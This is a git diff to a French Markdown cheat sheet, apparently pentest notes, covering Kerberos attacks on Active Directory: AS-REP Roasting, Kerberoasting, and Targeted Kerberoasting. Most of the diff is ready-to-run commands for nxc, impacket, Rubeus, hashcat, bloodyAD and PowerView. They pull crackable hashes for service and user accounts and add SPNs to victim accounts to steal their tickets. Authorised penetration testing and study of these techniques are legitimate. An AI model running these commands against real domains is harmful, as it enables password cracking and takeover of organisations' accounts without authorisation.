@@ -158,27 +158,30 @@ go build -o kerbrute .
 
 Si un compte AD a l'option **"Do not require Kerberos preauthentication"** activée, un attaquant peut demander un AS-REP sans s'authentifier → la réponse contient un hash crackable offline.
 
-**Identifier les comptes vulnérables**
+**Sans compte AD (liste de usernames requise)**
+
+```bash
+# nxc — tester une liste de users sans mot de passe
+nxc ldap <IP_DC> -u users.txt -p '' --asreproast asreproast.txt --kdcHost <IP_DC>
+
+# impacket — même chose
+impacket-GetNPUsers -dc-ip <IP_DC> -no-pass -usersfile users.txt corp.com/ -outputfile hashes.asreproast
+```
+
+**Avec un compte AD**
+
+```bash
+# Kali — énumère les users vulnérables ET récupère les hashes
+impacket-GetNPUsers -dc-ip <IP_DC> -outputfile hashes.asreproast corp.com/<user>:<password>
+```
 
 ```powershell
-# Windows (PowerView)
+# Windows (PowerView) — identifier les comptes vulnérables
 Get-DomainUser -PreauthNotRequired
 ```
 
-```bash
-# Kali — sans -request pour juste lister les users vulnérables
-impacket-GetNPUsers -dc-ip <IP_DC> corp.com/pete
-```
-
-**Récupérer les hashes AS-REP**
-
-```bash
-# Kali
-impacket-GetNPUsers -dc-ip <IP_DC> -request -outputfile hashes.asreproast corp.com/pete
-```
-
 ```powershell
-# Windows (Rubeus)
+# Windows (Rubeus) — récupérer les hashes
 .\Rubeus.exe asreproast /nowrap
 ```
 
@@ -189,4 +192,99 @@ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr
 ```
 
 > **Targeted AS-REP Roasting** : si on a `GenericWrite` ou `GenericAll` sur un compte, on peut modifier son `UserAccountControl` pour désactiver la pré-authentification, récupérer le hash, puis remettre la valeur d'origine. En pratique, **Targeted Kerberoasting** est préféré pour le même prérequis — il suffit d'ajouter un SPN sans toucher au `userAccountControl`.
+
+### Kerberoasting
+
+Attaque sur l'étape **KRB_TGS_REP**. N'importe quel utilisateur du domaine (sans privilèges particuliers) peut demander un service ticket (TGS) pour n'importe quel compte possédant un SPN. Le KDC vérifie la validité du TGT mais **ne vérifie pas les permissions** de l'utilisateur sur le service. Il répond avec un TGS-REP dont une partie est chiffrée avec le hash du compte de service → crackable offline.
+
+> Cible prioritaire : les comptes **utilisateur** avec un SPN (IIS, MSSQL…). Les comptes machine, MSA et gMSA ont des mots de passe aléatoires de 120 caractères — inutile de les craquer. Même chose pour `krbtgt`.
+
+**Depuis Windows (Rubeus)**
+
+```powershell
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+```
+
+**Depuis Kali — nxc (avec un compte valide)**
+
+```bash
+nxc ldap <IP_DC> -u <user> -p <password> --kdcHost <IP_DC> --kerberoasting kerberoasting.txt
+```
+
+**Depuis Kali — impacket**
+
+```bash
+impacket-GetUserSPNs -request -dc-ip <IP_DC> corp.com/<user>:<password> -outputfile hashes.kerberoast
+```
+
+> Erreur `KRB_AP_ERR_SKEW` → synchroniser l'heure avec le DC : `sudo ntpdate <IP_DC>`
+
+**Cracker le hash (mode 13100)**
+
+```bash
+hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt
+```
+
+#### Kerberoasting via AS-REP Roasting
+
+Si on contrôle un compte AS-REP roastable (sans pré-auth), on peut l'utiliser pour kerberoaster d'autres comptes — sans avoir besoin d'un vrai mot de passe.
+
+**NetExec**
+```bash
+# -u : compte AS-REP roastable (pas de pré-auth requise)
+# --no-preauth-targets : liste des comptes à kerberoaster
+nxc ldap <IP_DC> -u <asrep_user> -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
+```
+
+**impacket**
+```bash
+GetUserSPNs.py -no-preauth <asrep_user> -usersfile services.txt -dc-host <IP_DC> <DOMAIN>/
+```
+
+**Rubeus**
+```powershell
+.\Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:<DOMAIN> /dc:<DC_HOST> /nopreauth:<asrep_user> /spn:<target_service>
+```
+
+#### Targeted Kerberoasting
+
+Requiert `GenericAll`, `GenericWrite`, `WriteProperty` ou `Validated-SPN` sur la cible. Les membres du groupe **Account Operators** ont généralement ces droits.
+
+**Depuis Kali — targetedKerberoast.py (recommandé, gère tout automatiquement)**
+
+```bash
+targetedKerberoast.py -v -d <domain> -u <user> -p <password>
+```
+
+**Depuis Kali — manuellement avec nxc**
+
+```bash
+# 1. Ajouter un SPN
+bloodyAD -d <domain> --host <IP_DC> -u <user> -p <password> set object <target> servicePrincipalName -v 'http/anything'
+
+# 2. Kerberoaster
+nxc ldap <IP_DC> -d <domain> -u <user> -p <password> --kerberoasting kerberoastables.txt
+
+# 3. Cleanup
+bloodyAD -d <domain> --host <IP_DC> -u <user> -p <password> remove object <target> servicePrincipalName -v 'http/anything'
+```
+
+**Depuis Windows — PowerView**
+
+```powershell
+# Vérifier que la cible n'a pas déjà un SPN
+Get-DomainUser 'victimuser' | Select serviceprincipalname
+
+# Ajouter un SPN
+Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
+
+# Récupérer le hash
+$User = Get-DomainUser 'victimuser'
+$User | Get-DomainSPNTicket | fl
+
+# Cleanup
+Set-DomainObject -Identity victimuser -Clear serviceprincipalname
+```
+
+> Toujours supprimer le SPN après exploitation pour ne pas laisser de vulnérabilité dans l'infra.
 
